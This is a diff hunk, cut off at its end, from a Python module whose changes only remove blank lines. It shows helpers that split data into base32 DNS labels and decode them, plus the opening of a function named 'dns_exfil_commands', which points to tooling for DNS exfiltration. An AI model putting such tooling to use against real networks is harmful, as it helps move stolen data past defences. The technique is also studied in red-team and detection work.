@@ -10,7 +10,6 @@ __all__ = [
     "dns_exfil_commands",
 ]
 
-
 def dns_encode_payload(data: bytes, *, label_max: int = 60) -> list[str]:
     """Encode bytes as a list of DNS label-safe base32 strings.
 
@@ -20,13 +19,11 @@ def dns_encode_payload(data: bytes, *, label_max: int = 60) -> list[str]:
     encoded = base64.b32encode(data).decode().rstrip("=")
     return [encoded[i : i + label_max] for i in range(0, len(encoded), label_max)]
 
-
 def dns_decode_payload(labels: list[str]) -> bytes:
     """Reconstruct bytes from DNS-encoded labels produced by :func:`dns_encode_payload`."""
     encoded = "".join(labels)
     pad = (8 - len(encoded) % 8) % 8
     return base64.b32decode(encoded + "=" * pad)
-
 
 def dns_exfil_commands(
     data: bytes,
